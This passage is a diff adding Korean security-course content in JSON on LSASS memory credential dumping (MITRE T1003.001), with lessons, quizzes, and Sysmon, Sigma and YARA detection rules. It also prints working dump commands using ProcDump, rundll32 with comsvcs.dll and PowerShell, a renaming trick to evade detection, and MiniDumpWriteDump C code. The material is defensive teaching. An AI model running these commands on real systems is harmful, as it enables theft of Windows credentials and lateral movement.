@@ -1,0 +1,1054 @@
+{
+  "techniqueId": "T1003.001",
+  "techniqueName": "OS Credential Dumping: LSASS Memory",
+  "tacticIds": ["t8"],
+  "tacticName": "Credential Access",
+  "levels": {
+    "beginner": {
+      "title": "LSASS 메모리 자격증명 덤프 기초",
+      "titleEn": "LSASS Memory Credential Dumping Basics",
+      "estimatedMinutes": 20,
+      "overviewPanel": {
+        "emoji": "🔑",
+        "question": "컴퓨터 메모리 속에 비밀번호가 남아있다면?",
+        "explanation": "Windows 시스템에서 사용자가 로그인하면, 운영체제는 인증 정보를 LSASS(Local Security Authority Subsystem Service)라는 프로세스 메모리에 보관합니다. 공격자는 이 메모리를 읽어 비밀번호, 해시, Kerberos 티켓 등을 탈취할 수 있습니다. 마치 호텔 프런트에 보관된 객실 마스터키를 훔치는 것과 같습니다.",
+        "learningGoals": [
+          { "emoji": "🧠", "title": "LSASS의 역할 이해", "desc": "Windows에서 LSASS가 왜 자격증명을 메모리에 보관하는지 학습합니다" },
+          { "emoji": "⚔️", "title": "공격 원리 파악", "desc": "공격자가 어떤 방식으로 메모리에서 자격증명을 추출하는지 알아봅니다" },
+          { "emoji": "🛡️", "title": "기본 방어 개념", "desc": "Credential Guard, PPL 등 핵심 방어 메커니즘의 개념을 이해합니다" }
+        ],
+        "nextLevelTeaser": "중급 과정에서 Mimikatz, ProcDump 등 실제 도구의 코드와 탐지 규칙을 분석합니다"
+      },
+      "chapters": [
+        {
+          "id": "ch1",
+          "title": "LSASS란 무엇인가?",
+          "panels": [
+            {
+              "type": "analogy",
+              "heading": "호텔 프런트의 마스터키 금고",
+              "emojis": "🏨🔑",
+              "content": "호텔에 투숙하면 프런트에서 객실 키를 발급받습니다. 하지만 프런트 직원은 모든 객실을 열 수 있는 마스터키를 금고에 보관하고 있죠. LSASS는 이 마스터키 금고와 같습니다. 사용자가 로그인하면 Windows는 인증 정보(비밀번호 해시, Kerberos 티켓 등)를 LSASS 프로세스 메모리에 보관합니다. 이는 SSO(Single Sign-On)나 네트워크 인증에 필요하기 때문입니다."
+            },
+            {
+              "type": "concept",
+              "heading": "LSASS 프로세스의 역할",
+              "emojis": "⚙️",
+              "content": "LSASS(Local Security Authority Subsystem Service)는 Windows 보안의 핵심 프로세스입니다. 주요 역할: ① 사용자 로그인 인증 처리, ② 보안 토큰 생성 및 관리, ③ 보안 정책 적용, ④ 보안 감사 로그 기록. lsass.exe는 항상 실행 중이며, 이 프로세스가 중단되면 시스템이 즉시 재시작됩니다."
+            },
+            {
+              "type": "comparison_table",
+              "heading": "LSASS에 저장되는 자격증명 유형",
+              "headers": ["유형", "설명", "위험도"],
+              "rows": [
+                ["NTLM 해시", "비밀번호의 해시값 (Pass-the-Hash 공격 가능)", "🔴 높음"],
+                ["Kerberos 티켓", "도메인 인증용 티켓 (Golden Ticket 공격 가능)", "🔴 높음"],
+                ["평문 비밀번호", "WDigest 활성 시 평문 저장 (구버전)", "🔴 매우 높음"],
+                ["PIN/생체인증 키", "Windows Hello 인증 키", "🟡 중간"]
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch2",
+          "title": "공격 원리: 메모리에서 비밀번호 꺼내기",
+          "panels": [
+            {
+              "type": "analogy",
+              "heading": "금고를 열지 않고 엿보는 법",
+              "emojis": "👀🔓",
+              "content": "마스터키 금고를 직접 열지 못하더라도, 금고의 틈새로 들여다보거나 금고의 사본을 만들 수 있다면? 공격자는 LSASS 프로세스의 메모리를 '읽는' 방식으로 자격증명을 탈취합니다. 이는 금고 자체를 파괴하지 않으면서도 그 안의 내용물을 복사하는 것과 같습니다."
+            },
+            {
+              "type": "concept",
+              "heading": "공격의 3단계",
+              "emojis": "🎯",
+              "content": "LSASS 메모리 덤프 공격은 3단계로 진행됩니다: ① 권한 획득 — 관리자 권한이 필요합니다 (SeDebugPrivilege). ② 메모리 접근 — LSASS 프로세스의 메모리를 읽거나 덤프 파일로 저장합니다. ③ 자격증명 추출 — 덤프된 데이터에서 비밀번호 해시, 티켓 등을 파싱합니다."
+            },
+            {
+              "type": "diagram",
+              "heading": "LSASS 덤프 공격 흐름",
+              "ascii": "  [공격자]                    [대상 시스템]\n     │                           │\n     ├── ① 관리자 권한 획득 ──→ │\n     │                           │\n     ├── ② LSASS PID 확인 ───→  │  lsass.exe (PID: 672)\n     │                           │\n     ├── ③ 메모리 덤프 ────→    │  MiniDumpWriteDump()\n     │                           │      │\n     │                           │      ▼\n     │                     [lsass.dmp 파일 생성]\n     │                           │\n     ├── ④ 파일 전송 ←──────    │\n     │                           │\n     ▼                           │\n [오프라인 분석]                  │\n  Mimikatz로                     │\n  자격증명 추출                  │"
+            }
+          ]
+        },
+        {
+          "id": "ch3",
+          "title": "주요 공격 도구 개요",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "대표적인 LSASS 덤프 도구들",
+              "emojis": "🛠️",
+              "content": "공격자들이 LSASS 메모리를 덤프하는 데 사용하는 주요 도구: ① Mimikatz — 가장 유명한 자격증명 탈취 도구. sekurlsa::logonpasswords 명령으로 직접 추출. ② ProcDump — Microsoft의 공식 시스템 진단 도구. 합법적 도구이므로 탐지가 어려움. ③ comsvcs.dll — Windows 내장 DLL. rundll32.exe로 호출하여 미니덤프 생성. ④ Task Manager — Windows 작업 관리자에서도 프로세스 덤프 가능."
+            },
+            {
+              "type": "comparison_table",
+              "heading": "도구별 특성 비교",
+              "headers": ["도구", "유형", "탐지 난이도", "사용 빈도"],
+              "rows": [
+                ["Mimikatz", "전용 공격 도구", "🟢 쉬움", "★★★★★"],
+                ["ProcDump", "합법적 MS 도구", "🟡 중간", "★★★★☆"],
+                ["comsvcs.dll", "Windows 내장", "🔴 어려움", "★★★☆☆"],
+                ["Task Manager", "Windows 기본", "🔴 매우 어려움", "★★☆☆☆"],
+                ["Direct syscall", "커스텀 코드", "🔴 매우 어려움", "★★★☆☆"]
+              ]
+            },
+            {
+              "type": "warning",
+              "heading": "교육 목적 안내",
+              "content": "이 강의에서 소개하는 도구와 기법은 보안 전문가가 방어 전략을 수립하기 위해 '공격 원리를 이해하는 것'이 목적입니다. 허가 없이 타인의 시스템에 이러한 기법을 사용하면 법적 처벌을 받을 수 있습니다."
+            }
+          ]
+        },
+        {
+          "id": "ch4",
+          "title": "실제 사이버 공격 사례",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "APT29 (Cozy Bear) — SolarWinds 공격",
+              "emojis": "🐻",
+              "content": "러시아 정부와 연계된 APT29는 2020년 SolarWinds 공급망 공격에서 LSASS 메모리 덤프를 핵심 기법으로 사용했습니다. 초기 침투 후 Mimikatz 변형을 이용해 도메인 관리자 자격증명을 탈취하고, 이를 Golden Ticket 공격으로 연결하여 Microsoft 365 환경까지 침투했습니다."
+            },
+            {
+              "type": "concept",
+              "heading": "Lazarus Group — 금융기관 공격",
+              "emojis": "💰",
+              "content": "북한 정찰총국과 연계된 Lazarus Group은 SWIFT 은행 시스템 공격에서 자격증명 탈취를 적극 활용했습니다. 대상 시스템의 LSASS 메모리에서 추출한 자격증명으로 내부 네트워크를 횡단이동(Lateral Movement)하여 핵심 금융 시스템에 접근했습니다."
+            },
+            {
+              "type": "info",
+              "heading": "한국 사례: 국내 금융기관 침해",
+              "emojis": "🇰🇷",
+              "content": "KISA 침해사고 분석 보고서에 따르면, 국내 금융기관 대상 APT 공격에서도 LSASS 메모리 덤프가 빈번하게 사용되었습니다. 특히 comsvcs.dll을 이용한 Living-off-the-Land(LotL) 기법이 다수 탐지되었으며, 이는 기존 안티바이러스를 우회하기 위한 전략이었습니다."
+            }
+          ]
+        },
+        {
+          "id": "ch5",
+          "title": "기본 방어 전략",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "핵심 방어 메커니즘",
+              "emojis": "🛡️",
+              "content": "LSASS 메모리 덤프를 방어하는 핵심 기술: ① Credential Guard — 가상화 기반으로 LSASS를 격리. ② PPL (Protected Process Light) — LSASS를 보호 프로세스로 설정하여 일반 프로세스의 메모리 접근 차단. ③ WDigest 비활성화 — 레지스트리 설정으로 평문 비밀번호 저장 방지."
+            },
+            {
+              "type": "comparison_table",
+              "heading": "방어 수단 비교",
+              "headers": ["방어 수단", "효과", "적용 조건", "우회 가능성"],
+              "rows": [
+                ["Credential Guard", "NTLM 해시 보호", "VBS 지원 하드웨어", "커널 취약점"],
+                ["PPL", "메모리 접근 차단", "Win 8.1+", "드라이버 취약점"],
+                ["WDigest 비활성화", "평문 저장 방지", "레지스트리 설정", "없음"],
+                ["LSA RunAsPPL", "LSASS 보호", "Win 10+", "커널 취약점"],
+                ["LSASS UEFI Lock", "부팅 시 잠금", "Win 11+", "하드웨어 공격"]
+              ]
+            },
+            {
+              "type": "info",
+              "heading": "탐지 관점: 어떤 로그를 봐야 할까?",
+              "emojis": "🔍",
+              "content": "LSASS 메모리 접근을 탐지하는 핵심 로그: ① Sysmon Event ID 10 — 프로세스 접근 이벤트 (TargetImage에 lsass.exe 필터). ② Windows Security Event 4656/4663 — 객체 핸들 요청/접근 감사. ③ Windows Defender Alert — LSASS 접근 이상 행위 탐지. 이런 로그를 SIEM에서 모니터링하면 초기 단계에서 공격을 탐지할 수 있습니다."
+            }
+          ]
+        }
+      ],
+      "miniLabs": [
+        {
+          "type": "matching_game",
+          "title": "LSASS 관련 개념 매칭",
+          "description": "각 설명에 맞는 올바른 용어를 선택하세요.",
+          "pairs": [
+            { "left": "Windows 인증의 핵심 프로세스로, 자격증명을 메모리에 보관", "right": "LSASS" },
+            { "left": "비밀번호의 단방향 해시값으로, Pass-the-Hash 공격에 사용", "right": "NTLM 해시" },
+            { "left": "가상화 기반으로 LSASS 메모리를 격리하는 보안 기능", "right": "Credential Guard" },
+            { "left": "프로세스를 보호 모드로 설정하여 메모리 접근을 제한", "right": "PPL" },
+            { "left": "가장 유명한 자격증명 탈취 도구로, sekurlsa 모듈 포함", "right": "Mimikatz" }
+          ]
+        },
+        {
+          "type": "ordering_game",
+          "title": "LSASS 덤프 공격 순서 배열",
+          "description": "공격자가 LSASS 메모리를 덤프하는 올바른 순서로 배열하세요.",
+          "items": [
+            { "label": "초기 침투 (Initial Access)" },
+            { "label": "권한 상승 (Privilege Escalation)" },
+            { "label": "LSASS 프로세스 PID 확인" },
+            { "label": "메모리 덤프 실행 (MiniDump)" },
+            { "label": "덤프 파일 오프라인 분석" },
+            { "label": "자격증명으로 횡단이동 (Lateral Movement)" }
+          ]
+        }
+      ],
+      "quiz": {
+        "questions": [
+          {
+            "question": "LSASS 프로세스가 자격증명을 메모리에 보관하는 주된 이유는?",
+            "options": [
+              "디스크 공간 절약을 위해",
+              "SSO 및 네트워크 인증 지원을 위해",
+              "디버깅 편의를 위해",
+              "바이러스 탐지를 위해"
+            ],
+            "correct": 1,
+            "explanation": "LSASS는 SSO(Single Sign-On)와 네트워크 리소스 접근 시 반복적인 인증을 방지하기 위해 자격증명을 메모리에 캐시합니다. 이 설계가 편의성과 보안의 트레이드오프입니다."
+          },
+          {
+            "question": "다음 중 합법적인 Microsoft 도구를 악용한 LSASS 덤프 방법은?",
+            "options": [
+              "Mimikatz sekurlsa::logonpasswords",
+              "ProcDump -ma lsass.exe",
+              "Custom shellcode injection",
+              "Brute force 공격"
+            ],
+            "correct": 1,
+            "explanation": "ProcDump는 Microsoft에서 공식 배포하는 시스템 진단 도구입니다. -ma 옵션으로 lsass.exe의 전체 메모리를 덤프할 수 있어, Living-off-the-Land 기법의 대표적 사례입니다."
+          },
+          {
+            "question": "Credential Guard의 핵심 보호 원리는?",
+            "options": [
+              "파일 암호화",
+              "네트워크 차단",
+              "가상화 기반 보안(VBS)으로 LSASS 격리",
+              "안티바이러스 스캔 강화"
+            ],
+            "correct": 2,
+            "explanation": "Credential Guard는 하드웨어 가상화(VBS)를 이용하여 LSASS 프로세스를 격리된 컨테이너에서 실행합니다. 이로 인해 관리자 권한이 있더라도 메모리에서 자격증명을 읽을 수 없습니다."
+          },
+          {
+            "question": "LSASS 메모리 접근을 탐지하는 가장 효과적인 Sysmon 이벤트 ID는?",
+            "options": [
+              "Event ID 1 (프로세스 생성)",
+              "Event ID 3 (네트워크 연결)",
+              "Event ID 10 (프로세스 접근)",
+              "Event ID 13 (레지스트리 변경)"
+            ],
+            "correct": 2,
+            "explanation": "Sysmon Event ID 10은 프로세스 간 메모리 접근을 기록합니다. TargetImage 필드에 lsass.exe를 필터링하면 LSASS에 대한 비정상적 접근 시도를 효과적으로 탐지할 수 있습니다."
+          },
+          {
+            "question": "SolarWinds 공급망 공격에서 LSASS 덤프를 활용한 APT 그룹은?",
+            "options": [
+              "APT28 (Fancy Bear)",
+              "APT29 (Cozy Bear)",
+              "Lazarus Group",
+              "FIN7"
+            ],
+            "correct": 1,
+            "explanation": "APT29(Cozy Bear)는 러시아 정부와 연계된 그룹으로, 2020년 SolarWinds 공급망 공격에서 LSASS 메모리 덤프를 통해 도메인 관리자 자격증명을 탈취하고 Golden Ticket 공격으로 Microsoft 365까지 침투했습니다."
+          }
+        ]
+      }
+    },
+    "intermediate": {
+      "title": "LSASS 메모리 덤프 기법과 탐지",
+      "titleEn": "LSASS Memory Dump Techniques & Detection",
+      "estimatedMinutes": 40,
+      "overviewPanel": {
+        "emoji": "🔬",
+        "question": "공격 도구의 코드를 읽고 탐지 규칙을 작성할 수 있나요?",
+        "explanation": "이 중급 과정에서는 Mimikatz, ProcDump, comsvcs.dll 등 실제 공격 도구의 작동 원리를 코드 수준에서 분석합니다. 또한 Sigma, Sysmon 규칙을 작성하여 이러한 공격을 탐지하는 방법을 학습합니다.",
+        "learningGoals": [
+          { "emoji": "💻", "title": "도구 코드 분석", "desc": "Mimikatz, ProcDump 등의 핵심 코드 로직을 이해합니다" },
+          { "emoji": "📝", "title": "탐지 규칙 작성", "desc": "Sigma 규칙과 Sysmon 설정을 작성하여 LSASS 접근을 탐지합니다" },
+          { "emoji": "🔄", "title": "우회 기법 이해", "desc": "공격자의 탐지 우회 기법과 그에 대한 대응 방법을 학습합니다" }
+        ],
+        "nextLevelTeaser": "고급 과정에서 커스텀 LSASS 덤퍼를 직접 구현하고 Credential Guard 우회 기법을 분석합니다"
+      },
+      "chapters": [
+        {
+          "id": "ch1",
+          "title": "Mimikatz 핵심 코드 분석",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "Mimikatz의 sekurlsa 모듈",
+              "emojis": "🔧",
+              "content": "Benjamin Delpy가 개발한 Mimikatz는 Windows 자격증명 보안 연구의 핵심 도구입니다. sekurlsa 모듈은 LSASS 프로세스 메모리에서 인증 정보를 추출하는 역할을 합니다. 핵심 API 호출: OpenProcess() → ReadProcessMemory() → 자격증명 구조체 파싱."
+            },
+            {
+              "type": "code",
+              "heading": "Mimikatz sekurlsa 핵심 로직 (간소화)",
+              "filename": "mimikatz_sekurlsa.c",
+              "language": "C",
+              "warning": "교육 목적 의사 코드 — 실제 코드와 다릅니다",
+              "lines": [
+                { "text": "// Mimikatz sekurlsa::logonpasswords 핵심 로직 (의사 코드)", "color": "slate" },
+                { "text": "", "color": "white" },
+                { "text": "HANDLE hProcess = OpenProcess(", "color": "cyan" },
+                { "text": "    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,", "color": "green" },
+                { "text": "    FALSE,", "color": "green" },
+                { "text": "    lsassPid  // LSASS 프로세스 ID", "color": "yellow" },
+                { "text": ");", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "// LSASS 메모리에서 인증 패키지 구조체 탐색", "color": "slate" },
+                { "text": "for (pkg in authPackages) {  // MSV1_0, Kerberos, WDigest...", "color": "purple" },
+                { "text": "    ReadProcessMemory(hProcess, pkg->listAddr, &logonList);", "color": "cyan" },
+                { "text": "    ", "color": "white" },
+                { "text": "    // 각 로그온 세션에서 자격증명 추출", "color": "slate" },
+                { "text": "    foreach (session in logonList) {", "color": "purple" },
+                { "text": "        decryptCredential(session->credential, lsaKey);", "color": "red" },
+                { "text": "        printf(\"User: %s\\nNTLM: %s\\n\", session->user, ntlmHash);", "color": "orange" },
+                { "text": "    }", "color": "purple" },
+                { "text": "}", "color": "purple" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch2",
+          "title": "ProcDump를 이용한 Living-off-the-Land",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "합법적 도구의 악용 (LotL)",
+              "emojis": "🎭",
+              "content": "Living-off-the-Land(LotL) 기법은 시스템에 이미 존재하거나 합법적으로 배포된 도구를 공격에 활용하는 전략입니다. ProcDump는 Microsoft Sysinternals Suite에 포함된 공식 진단 도구이므로, 대부분의 안티바이러스가 이를 차단하지 않습니다."
+            },
+            {
+              "type": "code",
+              "heading": "ProcDump를 이용한 LSASS 덤프",
+              "filename": "procdump_lsass.bat",
+              "language": "batch",
+              "warning": "교육 목적 명령어 — 허가된 환경에서만 실행",
+              "lines": [
+                { "text": "REM ProcDump를 이용한 LSASS 메모리 덤프", "color": "slate" },
+                { "text": "REM 전제조건: 관리자 권한 CMD", "color": "slate" },
+                { "text": "", "color": "white" },
+                { "text": "REM 방법 1: 프로세스 이름으로 덤프", "color": "green" },
+                { "text": "procdump.exe -ma lsass.exe lsass_dump.dmp", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "REM 방법 2: PID로 덤프 (탐지 우회 시도)", "color": "green" },
+                { "text": "for /f \"tokens=2\" %%i in ('tasklist /FI \"IMAGENAME eq lsass.exe\" ^| findstr lsass') do (", "color": "yellow" },
+                { "text": "    procdump.exe -ma %%i C:\\temp\\debug.dmp -accepteula", "color": "cyan" },
+                { "text": ")", "color": "yellow" },
+                { "text": "", "color": "white" },
+                { "text": "REM 방법 3: 파일명 변경하여 탐지 우회", "color": "green" },
+                { "text": "copy procdump.exe debug_tool.exe", "color": "orange" },
+                { "text": "debug_tool.exe -ma lsass.exe output.dmp", "color": "orange" }
+              ]
+            },
+            {
+              "type": "code",
+              "heading": "comsvcs.dll을 이용한 네이티브 덤프",
+              "filename": "comsvcs_dump.bat",
+              "language": "batch",
+              "warning": "Windows 내장 DLL 악용 — 교육 목적",
+              "lines": [
+                { "text": "REM comsvcs.dll 내장 MiniDump 함수 악용", "color": "slate" },
+                { "text": "REM Windows에 기본 포함된 DLL이므로 추가 도구 불필요", "color": "slate" },
+                { "text": "", "color": "white" },
+                { "text": "REM 1단계: LSASS PID 확인", "color": "green" },
+                { "text": "tasklist /FI \"IMAGENAME eq lsass.exe\"", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "REM 2단계: rundll32를 통한 MiniDump 호출", "color": "green" },
+                { "text": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump ^", "color": "red" },
+                { "text": "    <LSASS_PID> C:\\temp\\lsass.dmp full", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "REM PowerShell 원라이너 버전", "color": "green" },
+                { "text": "$pid = (Get-Process lsass).Id", "color": "purple" },
+                { "text": "rundll32.exe comsvcs.dll, MiniDump $pid dump.dmp full", "color": "red" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch3",
+          "title": "Windows API 호출 분석",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "핵심 Windows API",
+              "emojis": "🔌",
+              "content": "LSASS 메모리 덤프에 사용되는 핵심 Windows API: ① OpenProcess() — 대상 프로세스 핸들 획득. PROCESS_VM_READ 권한 필요. ② MiniDumpWriteDump() — DbgHelp.dll의 함수. 프로세스 메모리를 파일로 저장. ③ NtReadVirtualMemory() — NT Native API. 더 낮은 수준의 메모리 읽기."
+            },
+            {
+              "type": "code",
+              "heading": "MiniDumpWriteDump 호출 패턴",
+              "filename": "minidump_api.c",
+              "language": "C",
+              "warning": "API 호출 패턴 분석용 — 교육 목적",
+              "lines": [
+                { "text": "#include <DbgHelp.h>", "color": "green" },
+                { "text": "#pragma comment(lib, \"DbgHelp.lib\")", "color": "green" },
+                { "text": "", "color": "white" },
+                { "text": "// LSASS PID 획득", "color": "slate" },
+                { "text": "DWORD lsassPid = GetLsassPid();  // tasklist 또는 EnumProcesses", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "// 프로세스 핸들 획득", "color": "slate" },
+                { "text": "HANDLE hProc = OpenProcess(", "color": "cyan" },
+                { "text": "    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,", "color": "yellow" },
+                { "text": "    FALSE, lsassPid);", "color": "yellow" },
+                { "text": "", "color": "white" },
+                { "text": "// 출력 파일 생성", "color": "slate" },
+                { "text": "HANDLE hFile = CreateFile(L\"lsass.dmp\", GENERIC_WRITE,", "color": "cyan" },
+                { "text": "    0, NULL, CREATE_ALWAYS, 0, NULL);", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "// 전체 메모리 덤프 (MiniDumpWithFullMemory)", "color": "slate" },
+                { "text": "BOOL ok = MiniDumpWriteDump(", "color": "red" },
+                { "text": "    hProc, lsassPid, hFile,", "color": "red" },
+                { "text": "    MiniDumpWithFullMemory,  // 전체 메모리 포함", "color": "orange" },
+                { "text": "    NULL, NULL, NULL);", "color": "red" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch4",
+          "title": "Sysmon 기반 탐지 규칙",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "Sysmon Event ID 10: ProcessAccess",
+              "emojis": "📡",
+              "content": "Sysmon의 Event ID 10은 한 프로세스가 다른 프로세스의 메모리에 접근할 때 발생합니다. TargetImage 필드가 lsass.exe이고, GrantedAccess에 0x1010(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION) 이상의 권한이 포함되면 의심 대상입니다."
+            },
+            {
+              "type": "code",
+              "heading": "Sysmon 설정: LSASS 접근 모니터링",
+              "filename": "sysmon-config.xml",
+              "language": "xml",
+              "lines": [
+                { "text": "<!-- Sysmon 설정: LSASS 메모리 접근 탐지 -->", "color": "slate" },
+                { "text": "<Sysmon schemaversion=\"4.90\">", "color": "cyan" },
+                { "text": "  <EventFiltering>", "color": "cyan" },
+                { "text": "    <!-- LSASS 프로세스 접근 감시 -->", "color": "slate" },
+                { "text": "    <ProcessAccess onmatch=\"include\">", "color": "green" },
+                { "text": "      <TargetImage condition=\"is\">", "color": "yellow" },
+                { "text": "        C:\\Windows\\System32\\lsass.exe", "color": "orange" },
+                { "text": "      </TargetImage>", "color": "yellow" },
+                { "text": "    </ProcessAccess>", "color": "green" },
+                { "text": "", "color": "white" },
+                { "text": "    <!-- 신뢰할 수 있는 프로세스 제외 -->", "color": "slate" },
+                { "text": "    <ProcessAccess onmatch=\"exclude\">", "color": "green" },
+                { "text": "      <SourceImage condition=\"is\">", "color": "yellow" },
+                { "text": "        C:\\Windows\\System32\\svchost.exe", "color": "orange" },
+                { "text": "      </SourceImage>", "color": "yellow" },
+                { "text": "      <SourceImage condition=\"is\">", "color": "yellow" },
+                { "text": "        C:\\Windows\\System32\\csrss.exe", "color": "orange" },
+                { "text": "      </SourceImage>", "color": "yellow" },
+                { "text": "    </ProcessAccess>", "color": "green" },
+                { "text": "  </EventFiltering>", "color": "cyan" },
+                { "text": "</Sysmon>", "color": "cyan" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch5",
+          "title": "Sigma 탐지 규칙 작성",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "Sigma 규칙이란?",
+              "emojis": "📋",
+              "content": "Sigma는 SIEM 벤더에 독립적인 탐지 규칙 형식입니다. YAML로 작성되며, Splunk, Elasticsearch, Microsoft Sentinel 등 다양한 SIEM으로 변환할 수 있습니다. LSASS 메모리 접근을 탐지하는 Sigma 규칙을 작성하면 어떤 SIEM 환경에서든 활용 가능합니다."
+            },
+            {
+              "type": "code",
+              "heading": "LSASS 메모리 접근 Sigma 규칙",
+              "filename": "lsass_access.yml",
+              "language": "yaml",
+              "lines": [
+                { "text": "title: Suspicious LSASS Process Access", "color": "green" },
+                { "text": "id: 0d894093-71bc-43c3-a4cf-de7d2c37a8b2", "color": "slate" },
+                { "text": "status: production", "color": "cyan" },
+                { "text": "level: high", "color": "red" },
+                { "text": "description: >", "color": "green" },
+                { "text": "  Detects suspicious access to LSASS process memory", "color": "green" },
+                { "text": "  commonly used for credential dumping", "color": "green" },
+                { "text": "", "color": "white" },
+                { "text": "logsource:", "color": "yellow" },
+                { "text": "  category: process_access", "color": "cyan" },
+                { "text": "  product: windows", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "detection:", "color": "yellow" },
+                { "text": "  selection:", "color": "orange" },
+                { "text": "    TargetImage|endswith: '\\lsass.exe'", "color": "cyan" },
+                { "text": "    GrantedAccess|contains:", "color": "cyan" },
+                { "text": "      - '0x1010'  # VM_READ + QUERY_INFO", "color": "purple" },
+                { "text": "      - '0x1410'  # + QUERY_LIMITED", "color": "purple" },
+                { "text": "      - '0x1F0FFF' # FULL ACCESS", "color": "red" },
+                { "text": "  filter_system:", "color": "orange" },
+                { "text": "    SourceImage|startswith:", "color": "cyan" },
+                { "text": "      - 'C:\\Windows\\System32\\'", "color": "green" },
+                { "text": "  condition: selection and not filter_system", "color": "yellow" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch6",
+          "title": "탐지 우회 기법 분석",
+          "panels": [
+            {
+              "type": "warning",
+              "heading": "공격자의 탐지 우회 전략",
+              "content": "실무에서 공격자는 기본 탐지를 우회하기 위해 다양한 기법을 사용합니다. 방어자는 이러한 우회 기법을 이해해야 더 효과적인 탐지 규칙을 작성할 수 있습니다."
+            },
+            {
+              "type": "comparison_table",
+              "heading": "주요 탐지 우회 기법과 대응",
+              "headers": ["우회 기법", "원리", "대응 방법"],
+              "rows": [
+                ["도구명 변경", "procdump.exe → debug.exe 리네임", "해시 기반 탐지, YARA 시그니처"],
+                ["Direct Syscall", "ntdll.dll 우회하여 커널 직접 호출", "ETW 기반 커널 모니터링"],
+                ["LSASS 복제", "MiniDumpWriteDump 대신 snapshot 사용", "핸들 생성 이벤트 모니터링"],
+                ["메모리 내 분석", "디스크 접근 없이 메모리에서 파싱", "메모리 접근 패턴 이상 탐지"],
+                ["시간차 공격", "덤프와 추출을 시간 간격으로 분리", "시계열 상관 분석"]
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch7",
+          "title": "YARA 규칙으로 도구 탐지",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "YARA 규칙 기반 탐지",
+              "emojis": "🎯",
+              "content": "YARA는 파일 및 메모리에서 악성코드 패턴을 탐지하는 규칙 엔진입니다. Mimikatz와 같은 도구는 특유의 문자열과 바이너리 패턴을 가지고 있어, 파일명을 변경하더라도 YARA 규칙으로 탐지할 수 있습니다."
+            },
+            {
+              "type": "code",
+              "heading": "Mimikatz 탐지 YARA 규칙",
+              "filename": "detect_mimikatz.yar",
+              "language": "yara",
+              "lines": [
+                { "text": "rule Mimikatz_Strings {", "color": "cyan" },
+                { "text": "    meta:", "color": "green" },
+                { "text": "        author = \"GOTROOT EDU\"", "color": "green" },
+                { "text": "        description = \"Detects Mimikatz by string patterns\"", "color": "green" },
+                { "text": "        severity = \"critical\"", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "    strings:", "color": "yellow" },
+                { "text": "        $s1 = \"sekurlsa::logonpasswords\" ascii wide", "color": "orange" },
+                { "text": "        $s2 = \"gentilkiwi\" ascii  // 개발자 이름", "color": "orange" },
+                { "text": "        $s3 = \"mimikatz\" ascii wide nocase", "color": "orange" },
+                { "text": "        $s4 = \"lsadump::\" ascii wide", "color": "orange" },
+                { "text": "        $api1 = \"MiniDumpWriteDump\" ascii", "color": "purple" },
+                { "text": "        $api2 = \"OpenProcess\" ascii", "color": "purple" },
+                { "text": "", "color": "white" },
+                { "text": "    condition:", "color": "yellow" },
+                { "text": "        (2 of ($s*)) or ($api1 and $api2 and 1 of ($s*))", "color": "red" },
+                { "text": "}", "color": "cyan" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch8",
+          "title": "방어 아키텍처: 다층 방어",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "Defense-in-Depth 전략",
+              "emojis": "🏰",
+              "content": "단일 방어 메커니즘은 언제나 우회될 수 있습니다. 효과적인 LSASS 보호를 위해서는 다층 방어(Defense-in-Depth) 전략이 필요합니다: 예방 계층(Credential Guard + PPL) → 탐지 계층(Sysmon + Sigma + YARA) → 대응 계층(자동화된 격리 + 포렌식)."
+            },
+            {
+              "type": "diagram",
+              "heading": "다층 방어 아키텍처",
+              "ascii": "  ┌─────────────────────────────────────────────┐\n  │              Layer 1: 예방 (Prevention)       │\n  │  Credential Guard  │  PPL  │  WDigest Off    │\n  ├─────────────────────────────────────────────┤\n  │              Layer 2: 탐지 (Detection)        │\n  │  Sysmon EID 10  │  Sigma Rules  │  YARA      │\n  ├─────────────────────────────────────────────┤\n  │              Layer 3: 대응 (Response)          │\n  │  SOAR Playbook  │  Auto-Isolate  │  Forensic │\n  └─────────────────────────────────────────────┘"
+            }
+          ]
+        }
+      ],
+      "miniLabs": [
+        {
+          "type": "matching_game",
+          "title": "Windows API와 용도 매칭",
+          "description": "각 Windows API가 LSASS 덤프에서 어떤 역할을 하는지 매칭하세요.",
+          "pairs": [
+            { "left": "대상 프로세스의 핸들을 획득하는 API", "right": "OpenProcess" },
+            { "left": "프로세스 메모리를 파일로 저장하는 API", "right": "MiniDumpWriteDump" },
+            { "left": "프로세스의 가상 메모리를 직접 읽는 NT API", "right": "NtReadVirtualMemory" },
+            { "left": "DLL 내 함수 주소를 동적으로 가져오는 API", "right": "GetProcAddress" },
+            { "left": "lsass.exe의 PID를 찾기 위해 프로세스를 열거하는 API", "right": "EnumProcesses" }
+          ]
+        },
+        {
+          "type": "step_click",
+          "title": "ProcDump LSASS 덤프 시뮬레이션",
